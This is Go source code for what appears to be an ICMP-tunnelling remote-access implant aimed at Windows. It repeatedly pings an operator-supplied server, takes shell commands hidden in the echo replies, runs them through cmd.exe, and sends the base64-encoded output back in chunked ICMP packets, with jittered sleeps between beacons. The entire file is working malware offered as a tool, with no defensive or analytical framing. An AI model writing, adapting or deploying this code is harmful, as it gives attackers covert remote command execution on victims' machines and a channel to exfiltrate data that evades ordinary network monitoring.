package main

import (
    "bytes"
     b64 "encoding/base64"
    "encoding/json"
    "fmt"
    "log"
    "net"
    "math/rand"
    "os"
    "os/exec"
    "time"
    "strings"

    "golang.org/x/net/icmp"
    "golang.org/x/net/ipv4"
)

type Cmd struct {
    Cmd     string  `json:"cmd"`
    Output  string  `json:"output"`
}

const (
    ProtocolICMP = 1
    TTL = 128
    ChunkSize = 64
    SleepDuration = 60
)

func handleSleep(sleep int) {
    fmt.Println("Sleeping...")
    rand.Seed(time.Now().UnixNano())
    min := 1
    max := 5
    num := rand.Intn(max - min) + min
    sleepWithJitter := sleep * num
    time.Sleep(time.Duration(sleepWithJitter) * time.Second)
}

func makeJson(cmd string, output string) string {
    b64_cmd := b64.StdEncoding.EncodeToString([]byte(cmd))
    b64_output := b64.StdEncoding.EncodeToString([]byte(output))
    fmt.Println("output:")
    fmt.Println(output)
    fmt.Println("base64:")
    fmt.Println(b64_output)

    data, _ := json.Marshal(Cmd{Cmd: b64_cmd, Output: b64_output})
    return string(data) + "\n"
}
func parseBody(p int, b icmp.MessageBody) string {
    mb, _ := b.Marshal(p)
    result := mb
    start := strings.Index(string(result), "AAA") + 3
    end := strings.Index(string(result), "CCC")
    result = mb[start:end]

    return string(result)
}

func runCmd(sDec string) string {
    myCmd := exec.Command("cmd.exe", "/C", string(sDec))
    //myCmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
    cmdOut, err := myCmd.Output()
    if err != nil {
        return "Error with cmd: " + err.Error() + " " + string(sDec)
    } else {
        return string(cmdOut)
    }
}
//ref: https://play.golang.org/p/b5f1aRBBUn
func exchange(conn net.Conn, timeout time.Duration, data []byte) ([]byte, error) {
    conn.SetDeadline(time.Now().Add(timeout))

    if _, err := conn.Write(data); err != nil {
        return nil, err
    }

    rb := make([]byte, 1500)
    n, err := conn.Read(rb)
    if err != nil {
        return nil, err
    }
    return rb[:n], nil
}

//ref: https://play.golang.org/p/b5f1aRBBUn
func Pingv4(address net.IP, timeout time.Duration, ttl int, payload []byte) ([]byte, error) {
    conn, err := net.DialTimeout("ip4:icmp", address.String(), timeout)
    if err != nil {
        return nil, err
    }
    defer conn.Close()

    opts := ipv4.NewConn(conn)
    if err := opts.SetTTL(ttl); err != nil {
        return nil, fmt.Errorf("set TTL %d: %s", ttl, err)
    }

    return exchange(conn, timeout, payload)
}

func buildICMP(t icmp.Type, seq int, size int, data string) ([]byte, error) {
    var buf bytes.Buffer
    data = "AAA" + data + "CCC"
    size = size + 6
    template := []byte(data)
    for count := size / len(template); count > 0; count-- {
        buf.Write(template)
    }

    if diff := size - buf.Len(); diff > 0 {
        buf.Write(template[:diff])
    }

    msg := icmp.Message{
        Type: t,
        Code: 0,
        Body: &icmp.Echo{
            ID:   os.Getpid() & 0xffff,
            Seq:  seq,
            Data: buf.Bytes(),
        },
    }

    return msg.Marshal(nil)
}

func chunk(s string, n int) []string {
    sub := ""
    subs := []string{}
    runes := bytes.Runes([]byte(s))
    l := len(runes)
    for i, r := range runes {
        sub = sub + string(r)
        if (i+1)%n == 0 {
            subs = append(subs, sub)
            sub = ""
        } else if (i + 1) == l {
            subs = append(subs, sub)
        }
    }

    return subs
}

func main() {
    ip := ""
    if len(os.Args)  > 1 {
        ip = os.Args[1]
    } else {
        fmt.Println("Usage: " + os.Args[0] + " [server-ip]")
        os.Exit(0)
    }

    for true {
        timeout := 10 * time.Second
        seq := 294
        v4 := net.ParseIP(ip)
        if v4 == nil {
            fmt.Println("Invalid IP")
            os.Exit(1)
        }
        payloadV4, _ := buildICMP(ipv4.ICMPTypeEcho, seq, len("windows 10"),"windows 10")
        seq = seq + 1
        reply, err := Pingv4(v4, timeout, TTL, payloadV4)
        rm, err := icmp.ParseMessage(ProtocolICMP, reply)
        if err != nil {
            handleSleep(SleepDuration)
            continue
        }
        result := parseBody(rm.Type.Protocol(), rm.Body)
        if err != nil {
            fmt.Println("Pingv4: " + err.Error())
            handleSleep(SleepDuration)
            continue
        }
        fmt.Println("command to execute:")
        fmt.Println(string(result))

        if len(string(result)) < 1  {
            handleSleep(SleepDuration)
            continue
        } else if strings.Index(string(result), "exit") > 1 {
            os.Exit(0)
        }

        dataCmd := makeJson(string(result), runCmd(string(result)) )
        if len(dataCmd) < ChunkSize {
            payloadV4, _ := buildICMP(ipv4.ICMPTypeEcho, seq, len(dataCmd),dataCmd)
            seq = seq + 1
            if reply, err := Pingv4(v4, timeout, TTL, payloadV4); err != nil {
                fmt.Println("Pingv4: " + err.Error())
                continue
            } else {
                if hdr, err := icmp.ParseIPv4Header(reply); err != nil {
                    log.Printf("cannot parse IPv4 header: %s", err)
                } else {
                    log.Printf("IPv4 header: %v", hdr)
                }
            }
        } else {
            fmt.Println("chunking...")
            dataArray := chunk(dataCmd, ChunkSize)
            payloadV4, _ = buildICMP(ipv4.ICMPTypeEcho, seq, 5, "START")
            reply, _ = Pingv4(v4, timeout, TTL, payloadV4)

            for _, data := range dataArray {
                payloadV4, _ := buildICMP(ipv4.ICMPTypeEcho, seq, len(data),data)
                seq = seq + 1
                if reply, err := Pingv4(v4, timeout, TTL, payloadV4); err != nil {
                    fmt.Println("Pingv4: " + err.Error())
                    continue
                } else {
                    if hdr, err := icmp.ParseIPv4Header(reply); err != nil {
                        log.Printf("cannot parse IPv4 header: %s", err)
                    } else {
                        log.Printf("IPv4 header: %v", hdr)
                    }
                }
            }
        }

        payloadV4, _ = buildICMP(ipv4.ICMPTypeEcho, seq, 3, "END")
        reply, _ = Pingv4(v4, timeout, TTL, payloadV4)
        seq = seq + 1
        handleSleep(SleepDuration)
    }
}
